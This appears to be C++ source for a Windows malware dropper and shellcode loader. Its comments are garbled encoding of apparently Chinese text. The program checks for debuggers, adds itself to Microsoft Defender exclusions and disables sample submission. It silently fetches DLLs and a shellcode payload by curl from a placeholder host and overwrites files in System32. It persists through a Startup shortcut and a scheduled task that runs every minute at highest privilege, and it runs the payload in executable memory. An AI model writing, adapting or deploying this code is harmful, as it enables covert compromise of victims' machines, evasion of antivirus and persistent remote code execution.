#include <iostream>
#include <fstream>
#include <vector>
#include <thread>
#include <string>
using namespace std;
#include <windows.h>
#include <shlobj.h> // ����IShellLink��IPersistFile����
#pragma comment(lib, "ole32.lib")
#include <shlwapi.h>
#include <tchar.h>
#pragma comment(lib, "shlwapi.lib")
#include<math.h>
#include <UrlMon.h>  //URLDownloadToFile����������������Ӿ�̬��ͷ�ļ�
#pragma comment(lib, "urlmon.lib")  //��<UrlMon.h> ͷ�ļ����׵Ŀ��ļ�
#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )//����ʾ����̨
#include <filesystem>
#include<time.h>





std::vector<unsigned char> readShellcodeFile(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        throw std::runtime_error("�޷����ļ�: " + filePath);
    }

    std::vector<unsigned char> shellcode((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    return shellcode;
}




int exe_local_file(const char* exePath) {

    char command[256];

    // ���������ַ���
    snprintf(command, sizeof(command), "start /b %s", exePath);

    // ִ������
    int result = system(command);


    // ���ִ�н��
    if (result == 0) {
        std::cout << "����ִ�гɹ�" << std::endl;
    }
    else {
        std::cout << "����ִ��ʧ��" << std::endl;
    }
    return 0;

}





int  read_local_file(string sourceFilePath, const char* destinationFilePath) {

    // ��Դ�ļ����Զ�����ģʽ��ȡ
    std::ifstream sourceFile(sourceFilePath, std::ios::binary);
    if (!sourceFile) {
        std::cerr << "�޷���Դ�ļ�: " << sourceFilePath << std::endl;
        return 1;
    }

    // ��Ŀ���ļ����Զ�����ģʽд��
    std::ofstream destinationFile(destinationFilePath, std::ios::binary);
    if (!destinationFile) {
        std::cerr << "�޷���Ŀ���ļ�: " << destinationFilePath << std::endl;
        return 1;
    }

    // ��ȡԴ�ļ������ݲ�д��Ŀ���ļ�
    char buffer[1024];
    while (sourceFile.read(buffer, sizeof(buffer))) {
        destinationFile.write(buffer, sourceFile.gcount());
    }

    // ����ʣ�������
    if (sourceFile.eof()) {
        destinationFile.write(buffer, sourceFile.gcount());
    }
    else {
        std::cerr << "��ȡԴ�ļ�ʱ��������" << std::endl;
        return 1;
    }

    // �ر��ļ�
    sourceFile.close();
    destinationFile.close();

    std::cout << "�ļ��������" << std::endl;
    exe_local_file(destinationFilePath);
    return 0;


}


void executeShellcode(const std::vector<unsigned char>& shellcode) {
    // �����ִ���ڴ�
    void* execMemory = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMemory == NULL) {
        throw std::runtime_error("VirtualAlloc failed");
    }

    // ��Shellcode���Ƶ�������ڴ���

    if (!WriteProcessMemory(GetCurrentProcess(), execMemory, shellcode.data(), shellcode.size(), NULL)) {
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return;
    }

    // �����߳�ִ��Shellcode
    HANDLE hThread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(execMemory), NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "�̴߳���ʧ��" << std::endl;
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return;
    }

    // �ȴ��߳����
    WaitForSingleObject(hThread, INFINITE);

    // ������Դ
    VirtualFree(execMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);

}




void anti_debug() {
    if (IsDebuggerPresent()) {
        exit(1);
    }

    BOOL being_debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &being_debugged);
    if (being_debugged) {
        exit(1);
    }

    SetLastError(0);
    OutputDebugStringA("RlY");
    if (GetLastError() != 0) {
        exit(1);
    }
}





//������ݷ�ʽ
void CreateShortcut(const char* targetPath, const wchar_t* shortcutPath)
{
    HRESULT hres;
    IShellLink* psl;

    // ����IShellLink����
    hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
    if (SUCCEEDED(hres))
    {
        IPersistFile* ppf;

        // ���ÿ�ݷ�ʽ��Ŀ��·��
        psl->SetPath(targetPath);
        psl->SetDescription("My Shortcut Description");

        // ת��ΪIPersistFile�ӿ�
        hres = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);

        if (SUCCEEDED(hres))
        {
            // �����ݷ�ʽ (.lnk) �ļ�
            hres = ppf->Save(shortcutPath, TRUE);
            ppf->Release();
        }
        psl->Release();
    }
}





//ִ������
void ExecuteCommandSilently(const std::string& command) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // ��ʼ�� STARTUPINFO �ṹ��
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // ���ش���

    // ��ʼ�� PROCESS_INFORMATION �ṹ��
    ZeroMemory(&pi, sizeof(pi));

    // ��������
    if (!CreateProcess(
        NULL,                   // ��ָ����ִ���ļ�����ʹ��������
        const_cast<char*>(command.c_str()),  // �������ַ���
        NULL,                   // ���̰�ȫ����
        NULL,                   // �̰߳�ȫ����
        FALSE,                  // ���̳о��
        CREATE_NO_WINDOW,       // ����ʱ����ʾ����
        NULL,                   // ʹ�ø����̵Ļ�����
        NULL,                   // ʹ�ø����̵���ʼĿ¼
        &si,                    // ָ�� STARTUPINFO �ṹ��
        &pi))                   // ָ�� PROCESS_INFORMATION �ṹ��
    {
        //std::cerr << "CreateProcess failed (" << GetLastError() << ")" << std::endl;
        return;
    }

    // �ȴ����̽���
    WaitForSingleObject(pi.hProcess, INFINITE);

    // �رս��̺��߳̾��
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

//��ȡ���ļ��ľ���·��
std::string GetExecutablePath() {
    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}





void downloadFileHidden(const char* url, const char* outputPath) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // ���ô�����ʽΪ����
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char command[256];
    snprintf(command, sizeof(command), "curl %s -o %s", url, outputPath);

    // ��������
    if (!CreateProcess(NULL,   
        command,       
        NULL,          
        NULL,           
        FALSE,          
        0,              
        NULL,           
        NULL,           
        &si,            
        &pi)         
        ) {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return;
    }

    // �ȴ����̽���
    WaitForSingleObject(pi.hProcess, INFINITE);

    // �رս��̺��߳̾��
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}





int main() {
    //������
    anti_debug();
    std::string  file_pathsss = GetExecutablePath();  //��ȡ�ó�����ļ�·�������ԣ�
    //�ų��ó���
    std::string cmode_2 = "powershell -Command Add-MpPreference -ExclusionPath ";
    std::string resl = cmode_2 + file_pathsss;
    ExecuteCommandSilently(resl);
    std::string cmode_23 = "powershell -Command Add-MpPreference -ExclusionPath C:/Users/Public/Downloads/Downloada.exe";
    ExecuteCommandSilently(cmode_23);
    //�ر��Զ��ύ
    std::string comds_1 = "powershell -Command Set-MpPreference -SubmitSamplesConsent NeverSend";
    ExecuteCommandSilently(comds_1);



    //��������Ҫ��dll�ļ� ��ֹ������   
    downloadFileHidden("http://ip/msvcp1401.dll", "C:/Windows/SysWOW64/msvcp140.dll");
    downloadFileHidden("http://ip/msvcp140.dll", "c:/Windows/System32/msvcp140.dll");
    downloadFileHidden("http://ip/vcruntime140.dll", "c:/Windows/System32/vcruntime140.dll");


    //���ó���copyһ��ȥ���·��
    const char* s12 = "C:/Users/Public/Downloads/Downloada.exe";
    std::thread thread2(read_local_file, file_pathsss, s12);




    // ��ʼ��COM��
    CoInitialize(NULL);

    const wchar_t* shortcutFilePath_1 = L"C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/test1131110.lnk";
    // ������ݷ�ʽ
    CreateShortcut(s12, shortcutFilePath_1);
    // ����COM��
    CoUninitialize();


    downloadFileHidden("http://ip/output_86.bin", "c:/Windows/1.bin");
    const char* ssdfds123 = " hhhhhh";
    // �������ƻ�  ʹ��ÿ����ִ��һ��
    std::thread ss1(ExecuteCommandSilently, "schtasks /Create /TN test91112310 /SC MINUTE /MO 1 /TR C:/Users/Public/Downloads/Downloada.exe /RL HIGHEST");


    //�ʵ�����һЩ���õ��ַ�
    const char* ssdsfds = "url is hhhhhh";
    //���������ִ�еĳ���
    try {


        /*
        ��ȡ�ļ����ݣ�������shellcode
        */
        std::string ss1 = "c:/Windows/1.bin";
        std::vector<unsigned char> sd = readShellcodeFile(ss1);
        std::thread shellcode_load(executeShellcode, sd);

        //ÿ200��ִ��һ��
        while (1) {
            //�ر��Զ��ύ
            ExecuteCommandSilently(comds_1);
            //�ų��ó���
            ExecuteCommandSilently(resl);
            Sleep(200000);
        }


    }
    catch (const std::exception& e) {
        std::cerr << "����: " << e.what() << std::endl;
    }

    return 0;
}








